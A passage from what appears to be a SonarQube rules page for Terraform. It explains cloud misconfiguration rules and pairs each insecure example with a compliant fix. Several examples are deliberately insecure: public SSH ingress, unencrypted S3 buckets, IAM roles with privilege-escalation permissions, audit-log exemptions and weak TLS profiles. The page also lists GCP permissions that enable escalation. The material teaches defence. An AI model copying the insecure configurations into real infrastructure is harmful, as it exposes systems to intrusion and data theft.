  location = google_cloud_run_service.default.location
  project = google_cloud_run_service.default.project
  service = google_cloud_run_service.default.name
  role = "roles/viewer"
  member = "user:name@example.com"
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6245">
              terraform:S6245
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is
read from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if
they were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure
itself.</p>
<p>There are three SSE options:</p>
<ul>
  <li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)
    <ul>
      <li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li>
    </ul>  </li>
  <li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)
    <ul>
      <li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li>
    </ul>  </li>
  <li> Server-Side Encryption with Customer-Provided Keys (SSE-C)
    <ul>
      <li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s
      encryption keys. </li>
    </ul>  </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive information. </li>
  <li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>
<h2>Sensitive Code Example</h2>
<p>Server-side encryption is not used:</p>
<pre>
resource "aws_s3_bucket" "example" { # Sensitive
  bucket = "example"
}
</pre>
<h2>Compliant Solution</h2>
<p>Server-side encryption with Amazon S3-managed keys is used for AWS provider version 3 or below:</p>
<pre>
resource "aws_s3_bucket" "example" {
  bucket = "example"

  server_side_encryption_configuration {
    rule {
      apply_server_side_encryption_by_default {
        sse_algorithm = "AES256"
      }
    }
  }
}
</pre>
<p>Server-side encryption with Amazon S3-managed keys is used for AWS provider version 4 or above:</p>
<pre>
resource "aws_s3_bucket" "example" {
  bucket = "example"
}

resource "aws_s3_bucket_server_side_encryption_configuration" "example" {
  bucket = aws_s3_bucket.example.bucket

  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "AES256"
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html">AWS documentation</a> - Protecting data using
  server-side encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6402">
              terraform:S6402
            </a>
          </td>
          <td>
            <details>
              <p>Domain Name Systems (DNS) are vulnerable by default to various types of attacks.</p>
<p>One of the biggest risks is DNS cache poisoning, which occurs when a DNS accepts spoofed DNS data, caches the malicious records, and potentially
sends them later in response to legitimate DNS request lookups. This attack typically relies on the attacker’s <a
href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">MITM</a> ability on the network and can be used to redirect users from an intended
website to a malicious website.</p>
<p>To prevent these vulnerabilities, Domain Name System Security Extensions (DNSSEC) ensure the integrity and authenticity of DNS data by digitally
signing DNS zones.</p>
<p>The public key of a DNS zone used to validate signatures can be trusted as DNSSEC is based on the following chain of trust:</p>
<ul>
  <li> The parent DNS zone adds a "fingerprint" of the public key of the child zone in a "DS record". </li>
  <li> The parent DNS zone signs it with its own private key. </li>
  <li> And this process continues until the root zone. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<p>The parent DNS zone (likely managed by the DNS registrar of the domain name) supports DNSSEC and</p>
<ul>
  <li> The DNS zone is public (contains data such as public reachable IP addresses). </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to use DNSSEC when creating private and public DNS zones.</p>
<p>Private DNS zones cannot be queried on the Internet and provide DNS name resolution for private networks. The risk of MITM attacks might be
considered low on these networks and therefore implementing DNSSEC is still recommended but not with a high priority.</p>
<p>Note: Choose a robust signing algorithm when setting up DNSSEC, such as <code>rsasha256</code>. The <a
href="https://en.wikipedia.org/wiki/SHA-1">insecure</a> <code>rsasha1</code> algorithm should no longer be used.</p>
<h2>Sensitive Code Example</h2>
<pre>
resource "google_dns_managed_zone" "example" { # Sensitive: dnssec_config is missing
  name     = "foobar"
  dns_name = "foo.bar."
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource "google_dns_managed_zone" "example" {
  name     = "foobar"
  dns_name = "foo.bar."

  dnssec_config {
    default_key_specs {
      algorithm = "rsasha256"
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cloud.google.com/dns/docs/dnssec-config">GCP Documentation</a> - Manage DNSSEC configuration </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/345">CWE-345 - Insufficient Verification of Data Authenticity</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/353">CWE-353 - Missing Support for Integrity Check</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6401">
              terraform:S6401
            </a>
          </td>
          <td>
            <details>
              <p>The likelihood of security incidents increases when cryptographic keys are used for a long time. Thus, to strengthen the data protection it’s
recommended to rotate the symmetric keys created with the Google Cloud Key Management Service (KMS) automatically and periodically. Note that it’s not
possible in GCP KMS to rotate asymmetric keys automatically.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The cryptographic key is a symmetric key. </li>
  <li> The application requires compliance with some security standards like PCI-DSS. </li>
</ul>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to rotate keys automatically and regularly. The shorter the key period, the less data can be decrypted by an attacker if a key is
compromised. So the key rotation period usually depends on the amount of data encrypted with a key or other requirements such as compliance with
security standards. In general, a period of time of 90 days can be used.</p>
<h2>Sensitive Code Example</h2>
<pre>
resource "google_kms_crypto_key" "noncompliant-key" { # Sensitive: no rotation period is defined
  name            = "example"
  key_ring        = google_kms_key_ring.keyring.id
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource "google_kms_crypto_key" "compliant-key" {
  name            = "example"
  key_ring        = google_kms_key_ring.keyring.id
  rotation_period = "7776000s" # 90 days
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cloud.google.com/kms/docs/key-rotation">GCP Documentation</a> - KMS Key rotation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6408">
              terraform:S6408
            </a>
          </td>
          <td>
            <details>
              <p>Creating custom roles that allow privilege escalation can allow attackers to maliciously exploit an organization’s cloud resources.</p>
<p>Certain GCP permissions allow impersonation of one or more privileged principals within a GCP infrastructure.<br> To prevent privilege escalation
after an account has been compromised, proactively follow GCP Security Insights and ensure that custom roles contain as few privileges as possible
that allow direct or indirect impersonation.</p>
<p>For example, privileges like <code>deploymentmanager.deployments.create</code> allow impersonation of service accounts, even if the name does not
sound like it.<br> Other privileges like <code>setIamPolicy</code>, which are more explicit, directly allow their holder to extend their
privileges.</p>
<p>After gaining a foothold in the target infrastructure, sophisticated attackers typically map their newfound roles to understand what is
exploitable.</p>
<p>The riskiest privileges are either:</p>
<ul>
  <li> At the infrastructure level: privileges to perform project, folder, or organization-wide administrative tasks. </li>
  <li> At the resource level: privileges to perform resource-wide administrative tasks. </li>
</ul>
<p>In either case, the following privileges should be avoided or granted only with caution:</p>
<ul>
  <li> <code><strong>.</strong>.setIamPolicy</code> </li>
  <li> <code>cloudbuilds.builds.create</code> </li>
  <li> <code>cloudfunctions.functions.create</code> </li>
  <li> <code>cloudfunctions.functions.update</code> </li>
  <li> <code>cloudscheduler.jobs.create</code> </li>
  <li> <code>composer.environments.create</code> </li>
  <li> <code>compute.instances.create</code> </li>
  <li> <code>dataflow.jobs.create</code> </li>
  <li> <code>dataproc.clusters.create</code> </li>
  <li> <code>deploymentmanager.deployments.create</code> </li>
  <li> <code>iam.roles.update</code> </li>
  <li> <code>iam.serviceAccountKeys.create</code> </li>
  <li> <code>iam.serviceAccounts.actAs</code> </li>
  <li> <code>iam.serviceAccounts.getAccessToken</code> </li>
  <li> <code>iam.serviceAccounts.getOpenIdToken</code> </li>
  <li> <code>iam.serviceAccounts.implicitDelegation</code> </li>
  <li> <code>iam.serviceAccounts.signBlob</code> </li>
  <li> <code>iam.serviceAccounts.signJwt</code> </li>
  <li> <code>orgpolicy.policy.set</code> </li>
  <li> <code>run.services.create</code> </li>
  <li> <code>serviceusage.apiKeys.create</code> </li>
  <li> <code>serviceusage.apiKeys.list</code> </li>
  <li> <code>storage.hmacKeys.create</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This role requires impersonation to perform specific tasks with different privileges. </li>
  <li> This custom role is intended for a small group of administrators. </li>
</ul>
<p>There is a risk if you answered no to these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use a permission that does not allow privilege escalation.</p>
<h2>Sensitive Code Example</h2>
<p>Lightweight custom role intended for a developer:</p>
<pre>
resource "google_organization_iam_custom_role" "example" {
  permissions = [
    "iam.serviceAccounts.getAccessToken",     # Sensitive
    "iam.serviceAccounts.getOpenIdToken",     # Sensitive
    "iam.serviceAccounts.actAs",              # Sensitive
    "iam.serviceAccounts.implicitDelegation", # Sensitive
    "resourcemanager.projects.get",
    "resourcemanager.projects.list",
    "run.services.create",
    "run.services.delete",
    "run.services.get",
    "run.services.getIamPolicy",
    "run.services.list",
    "run.services.update",
  ]
}
</pre>
<p>Lightweight custom role intended for a read-only user:</p>
<pre>
resource "google_project_iam_custom_role" "example" {
  permissions = [
    "iam.serviceAccountKeys.create",        # Sensitive
    "iam.serviceAccountKeys.get",           # Sensitive
    "deploymentmanager.deployments.create", # Sensitive
    "cloudbuild.builds.create",             # Sensitive
    "resourcemanager.projects.get",
    "resourcemanager.projects.list",
    "run.services.get",
    "run.services.getIamPolicy",
    "run.services.list",
  ]
}
</pre>
<h2>Compliant Solution</h2>
<p>Lightweight custom role intended for a developer:</p>
<pre>
resource "google_project_iam_custom_role" "example" {
  permissions = [
    "resourcemanager.projects.get",
    "resourcemanager.projects.list",
    "run.services.create",
    "run.services.delete",
    "run.services.get",
    "run.services.getIamPolicy",
    "run.services.list",
    "run.services.update",
  ]
}
</pre>
<p>Lightweight custom role intended for a read-only user:</p>
<pre>
resource "google_project_iam_custom_role" "example" {
  permissions = [
    "resourcemanager.projects.get",
    "resourcemanager.projects.list",
    "run.services.get",
    "run.services.getIamPolicy",
    "run.services.list",
  ]
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cloud.google.com/iam/docs/custom-roles-permissions-support">GCP IAM Docs</a> - Support levels for permissions in custom roles
  </li>
  <li> <a href="https://cloud.google.com/iam/docs/understanding-custom-roles">GCP IAM Docs</a> - Understanding IAM custom roles </li>
  <li> <a href="https://www.youtube.com/watch?v=Z-JFVJZ-HDA">DEFONConference Youtube Video</a> - DEF CON Safe Mode - Dylan Ayrey and Allison Donovan -
  Lateral Movement &amp; Privilege Escalation in GCP </li>
  <li> <a href="https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/">Rhino Security Labs</a> - Privilege Escalation
  in Google Cloud Platform - Part 1 (IAM) </li>
  <li> <a href="https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/">Rhino Security Labs</a> - Privilege
  Escalation in Google Cloud Platform - Part 2 (Non-IAM) </li>
  <li> <a href="https://www.praetorian.com/blog/google-cloud-platform-gcp-service-account-based-privilege-escalation-paths/">Praetorian</a> - Google
  Cloud Platform (GCP) Service Account-based Privilege Escalation paths </li>
  <li> <a href="https://cloud.google.com/iam/docs/manage-policy-insights">GCP Docs</a> - Security Insights </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6407">
              terraform:S6407
            </a>
          </td>
          <td>
            <details>
              <p>App Engine supports encryption in transit through TLS. As soon as the app is deployed, it can be requested using <code>appspot.com</code> domains
or custom domains. By default, endpoints accept both clear-text and encrypted traffic. When communication isn’t encrypted, there is a risk that an
attacker could intercept it and read confidential information.</p>
<p>When creating an App Engine, request handlers can be set with different security level for encryption:</p>
<ul>
  <li> <code>SECURE_NEVER</code>: only HTTP requests are allowed (HTTPS requests are redirected to HTTP). </li>
  <li> <code>SECURE_OPTIONAL</code> and <code>SECURE_DEFAULT</code>: both HTTP and HTTPS requests are allowed. </li>
  <li> <code>SECURE_ALWAYS</code>: only HTTPS requests are allowed (HTTP requests are redirected to HTTPS). </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The handler serves confidential data in HTTP responses. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended for App Engine handlers to require TLS for all traffic. It can be achieved by setting the security level to
<code>SECURE_ALWAYS</code>.</p>
<h2>Sensitive Code Example</h2>
<p><code>SECURE_DEFAULT</code>, <code>SECURE_NEVER</code> and <code>SECURE_OPTIONAL</code> are sensitive TLS security level:</p>
<pre>
resource "google_app_engine_standard_app_version" "example" {
  version_id = "v1"
  service    = "default"
  runtime    = "nodejs"

  handlers {
    url_regex                   = ".*"
    redirect_http_response_code = "REDIRECT_HTTP_RESPONSE_CODE_301"
    security_level              = "SECURE_OPTIONAL" # Sensitive
    script {
      script_path = "auto"
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>Force the use of TLS for the handler by setting the security level on <code>SECURE_ALWAYS</code>:</p>
<pre>
resource "google_app_engine_standard_app_version" "example" {
  version_id = "v1"
  service    = "default"
  runtime    = "nodejs"

  handlers {
    url_regex                   = ".*"
    redirect_http_response_code = "REDIRECT_HTTP_RESPONSE_CODE_301"
    security_level              = "SECURE_ALWAYS"
    script {
      script_path = "auto"
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://cloud.google.com/appengine/docs/standard/nodejs/application-security">GCP Documentation</a> - Overview of App Security </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6409">
              terraform:S6409
            </a>
          </td>
          <td>
            <details>
              <p>Enabling Legacy Authorization, Attribute-Based Access Control (ABAC), on Google Kubernetes Engine resources can reduce an organization’s ability to
protect itself against access controls being compromised.</p>
<p>For Kubernetes, Attribute-Based Access Control has been superseded by Role-Based Access Control. ABAC is not under active development anymore and
thus should be avoided.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This resource is essential for the information system infrastructure. </li>
  <li> This resource is essential for mission-critical functions. </li>
  <li> Compliance policies require access to this resource to be enforced through the use of Role-Based Access Control. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Unless you are relying on ABAC, leave it disabled.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://cloud.google.com/kubernetes-engine">Google Kubernetes Engine</a>:</p>
<pre>
resource "google_container_cluster" "example" {
  enable_legacy_abac = true # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://cloud.google.com/kubernetes-engine">Google Kubernetes Engine</a>:</p>
<pre>
resource "google_container_cluster" "example" {
  enable_legacy_abac = false
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
  <li> <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#leave_abac_disabled">Google Cloud Documentation</a> -
  Hardening your cluster’s security </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6321">
              terraform:S6321
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Cloud platforms such as AWS, Azure, or GCP support virtual firewalls that can be used to restrict access to services by controlling inbound and
outbound traffic.<br> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services
traditionally listen, such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>
<h3>What is the potential impact?</h3>
<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a
vulnerability could have a high impact on the system.</p>
<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the
credentials to log in to the system.</p>
<h2>How to fix it</h2>
<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those
held by system administrators or those of <a href="https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1=h_ls">bastion-like</a>
servers.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>An ingress rule allowing all inbound SSH traffic for AWS:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource "aws_security_group" "noncompliant" {
  name        = "allow_ssh_noncompliant"
  description = "allow_ssh_noncompliant"
  vpc_id      = aws_vpc.main.id

  ingress {
    description      = "SSH rule"
    from_port        = 22
    to_port          = 22
    protocol         = "tcp"
    cidr_blocks      = ["0.0.0.0/0"]  # Noncompliant
  }
}
</pre>
<p>A security rule allowing all inbound SSH traffic for Azure:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource "azurerm_network_security_rule" "noncompliant" {
  priority                    = 100
  direction                   = "Inbound"
  access                      = "Allow"
  protocol                    = "Tcp"
  source_port_range           = "*"
  destination_port_range      = "22"
  source_address_prefix       = "*"  # Noncompliant
  destination_address_prefix  = "*"
}
</pre>
<p>A firewall rule allowing all inbound SSH traffic for GCP:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
resource "google_compute_firewall" "noncompliant" {
  network = google_compute_network.default.name

  allow {
    protocol = "tcp"
    ports    = ["22"]
  }

  source_ranges = ["0.0.0.0/0"]  # Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<p>An ingress rule allowing inbound SSH traffic from specific IP addresses for AWS:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource "aws_security_group" "compliant" {
  name        = "allow_ssh_compliant"
  description = "allow_ssh_compliant"
  vpc_id      = aws_vpc.main.id

  ingress {
    description      = "SSH rule"
    from_port        = 22
    to_port          = 22
    protocol         = "tcp"
    cidr_blocks      = ["1.2.3.0/24"]
  }
}
</pre>
<p>A security rule allowing inbound SSH traffic from specific IP addresses for Azure:</p>
<pre data-diff-id="2" data-diff-type="compliant">
resource "azurerm_network_security_rule" "compliant" {
  priority                    = 100
  direction                   = "Inbound"
  access                      = "Allow"
  protocol                    = "Tcp"
  source_port_range           = "*"
  destination_port_range      = "22"
  source_address_prefix       = "1.2.3.0"
  destination_address_prefix  = "*"
}
</pre>
<p>A firewall rule allowing inbound SSH traffic from specific IP addresses for GCP:</p>
<pre data-diff-id="3" data-diff-type="compliant">
resource "google_compute_firewall" "compliant" {
  network = google_compute_network.default.name

  allow {
    protocol = "tcp"
    ports    = ["22"]
  }

  source_ranges = ["10.0.0.1/32"]
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html">AWS Documentation</a> - Security groups for your VPC </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview">Azure Documentation</a> - Network security
  groups </li>
  <li> <a href="https://cloud.google.com/vpc/docs/using-firewalls">GCP Documentation</a> - Firewalls </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6281">
              terraform:S6281
            </a>
          </td>
          <td>
            <details>
              <p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>
<p>This access control can be relaxed with ACLs or policies.</p>
<p>To prevent permissive policies to be set on a S3 bucket the following settings can be configured:</p>
<ul>
  <li> <code>BlockPublicAcls</code>: to block or not public ACLs to be set to the S3 bucket. </li>
  <li> <code>IgnorePublicAcls</code>: to consider or not existing public ACLs set to the S3 bucket. </li>
  <li> <code>BlockPublicPolicy</code>: to block or not public policies to be set to the S3 bucket. </li>
  <li> <code>RestrictPublicBuckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket
  owner account. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive data. </li>
  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>
  <li> Many users have the permission to set ACL or policy to the S3 bucket. </li>
  <li> These settings are not already enforced to true at the account level. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to configure:</p>
<ul>
  <li> <code>BlockPublicAcls</code> to <code>true</code> to block new attempts to set public ACLs. </li>
  <li> <code>IgnorePublicAcls</code> to <code>true</code> to block existing public ACLs. </li>
  <li> <code>BlockPublicPolicy</code> to <code>true</code> to block new attempts to set public policies. </li>
  <li> <code>RestrictPublicBuckets</code> to <code>true</code> to restrict existing public policies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>By default, when not set, the <code>aws_s3_bucket_public_access_block</code> is fully deactivated (nothing is blocked):</p>
<pre>
resource "aws_s3_bucket" "example" { # Sensitive: no Public Access Block defined for this bucket
  bucket = "example"
}
</pre>
<p>This <code>aws_s3_bucket_public_access_block</code> allows public ACL to be set:</p>
<pre>
resource "aws_s3_bucket" "example" {  # Sensitive
  bucket = "examplename"
}

resource "aws_s3_bucket_public_access_block" "example-public-access-block" {
  bucket = aws_s3_bucket.example.id

  block_public_acls       = false # should be true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
</pre>
<h2>Compliant Solution</h2>
<p>This <code>aws_s3_bucket_public_access_block</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public
policies:</p>
<pre>
resource "aws_s3_bucket" "example" {
  bucket = "example"
}

resource "aws_s3_bucket_public_access_block" "example-public-access-block" {
  bucket = aws_s3_bucket.example.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html">AWS Documentation</a> - Blocking public
  access to your Amazon S3 storage </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6414">
              terraform:S6414
            </a>
          </td>
          <td>
            <details>
              <p>The Google Cloud audit logs service records administrative activities and accesses to Google Cloud resources of the project. It is important to
enable audit logs to be able to investigate malicious activities in the event of a security incident.</p>
<p>Some project members may be exempted from having their activities recorded in the Google Cloud audit log service, creating a blind spot and
reducing the capacity to investigate future security events.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The members exempted from having their activity logged have high privileges. </li>
  <li> Compliance rules require that audit log should be activated for all members. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to have a consistent audit logging policy for all project members and therefore not to create logging exemptions for certain
members.</p>
<h2>Sensitive Code Example</h2>
<pre>
resource "google_project_iam_audit_config" "example" {
  project = data.google_project.project.id
  service = "allServices"
  audit_log_config {
    log_type = "ADMIN_READ"
    exempted_members = [ # Sensitive
      "user:rogue.administrator@gmail.com",
    ]
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource "google_project_iam_audit_config" "example" {
  project = data.google_project.project.id
  service = "allServices"
  audit_log_config {
    log_type = "ADMIN_READ"
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cloud.google.com/logging/docs/audit">GCP Documentation</a> - Cloud Audit Logs overview </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6378">
              terraform:S6378
            </a>
          </td>
          <td>
            <details>
              <p>Disabling Managed Identities can reduce an organization’s ability to protect itself against configuration faults and credential leaks.</p>
<p>Authenticating via managed identities to an Azure resource solely relies on an API call with a non-secret token. The process is inner to Azure:
secrets used by Azure are not even accessible to end-users.</p>
<p>In typical scenarios without managed identities, the use of credentials can lead to mistakenly leaving them in code bases. In addition,
configuration faults may also happen when storing these values or assigning them permissions.</p>
<p>By transparently taking care of the Azure Active Directory authentication, Managed Identities allow getting rid of day-to-day credentials
management.</p>
<h2>Ask Yourself Whether</h2>
<p>The resource:</p>
<ul>
  <li> Needs to authenticate to Azure resources that support Azure Active Directory (AAD). </li>
  <li> Uses a different Access Control system that doesn’t guarantee the same security controls as AAD, or no Access Control system at all. </li>
</ul>
<p>There is a risk if you answered yes to all of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable the Managed Identities capabilities of this Azure resource. If supported, use a System-Assigned managed identity, as:</p>
<ul>
  <li> It cannot be shared across resources. </li>
  <li> Its life cycle is deeply tied to the life cycle of its Azure resource. </li>
  <li> It provides a unique independent identity. </li>
</ul>
<p>Alternatively, User-Assigned Managed Identities can also be used but don’t guarantee the properties listed above.</p>
<h2>Sensitive Code Example</h2>
<p>For Typical identity blocks:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource "azurerm_api_management" "example" { # Sensitive, the identity block is missing
  name           = "example"
  publisher_name = "company"
}
</pre>
<p>For connections between Kusto Clusters and Azure Data Factory:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource "azurerm_data_factory_linked_service_kusto" "example" {
  name                 = "example"
  use_managed_identity = false # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For Typical identity blocks:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource "azurerm_api_management" "example" {
  name           = "example"
  publisher_name = "company"

  identity {
    type = "SystemAssigned"
  }
}
</pre>
<p>For connections between Kusto Clusters and Azure Data Factory:</p>
<pre data-diff-id="2" data-diff-type="compliant">
resource "azurerm_data_factory_linked_service_kusto" "example" {
  name                 = "example"
  use_managed_identity = true
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview">Azure AD Documentation - Managed
  Identities Overview</a> </li>
  <li> <a
  href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/managed-identity-best-practice-recommendations">Azure AD Documentation - Managed Identities Best Practices</a> </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/services-support-managed-identities">Azure
  AD Documentation - Services that support managed identities</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6410">
              terraform:S6410
            </a>
          </td>
          <td>
            <details>
              <p>The TLS configuration of Google Cloud load balancers is defined through SSL policies.</p>
<h2>Why is this an issue?</h2>
<p>There are three managed profiles to choose from: <code>COMPATIBLE</code> (default), <code>MODERN</code> and <code>RESTRICTED</code>:</p>
<ul>
  <li> The <code>RESTRICTED</code> profile supports a reduced set of cryptographic algorithms, intended to meet stricter compliance requirements.
  </li>
  <li> The <code>MODERN</code> profile supports a wider set of cryptographic algorithms, allowing most modern clients to negotiate TLS. </li>
  <li> The <code>COMPATIBLE</code> profile supports the widest set of cryptographic algorithms, allowing connections from older client applications.
  </li>
</ul>
<p>The <code>MODERN</code> and <code>COMPATIBLE</code> profiles allow the use of older cryptographic algorithms that are no longer considered secure
and are susceptible to attack.</p>
<h3>What is the potential impact?</h3>
<p>An attacker may be able to force the use of the insecure cryptographic algorithms, downgrading the security of the connection. This allows them to
compromise the confidentiality or integrity of the data being transmitted.</p>
<p>The <code>MODERN</code> profile allows the use of the insecure SHA-1 signing algorithm. An attacker is able to generate forged data that passes a
signature check, appearing to be legitimate data.</p>
<p>The <code>COMPATIBLE</code> profile additionally allows the user of key exchange algorithms that do not support <a
href="https://en.wikipedia.org/wiki/Forward_secrecy">forward secrecy</a> as a feature. If the server’s private key is leaked, it can be used to
decrypt all network traffic sent to and from that server.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource "google_compute_ssl_policy" "example" {
  name            = "example"
  min_tls_version = "TLS_1_2"
  profile         = "COMPATIBLE" # Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
resource "google_compute_ssl_policy" "example" {
  name            = "example"
  min_tls_version = "TLS_1_2"
  profile         = "RESTRICTED"
}
</pre>
<h3>How does this work?</h3>
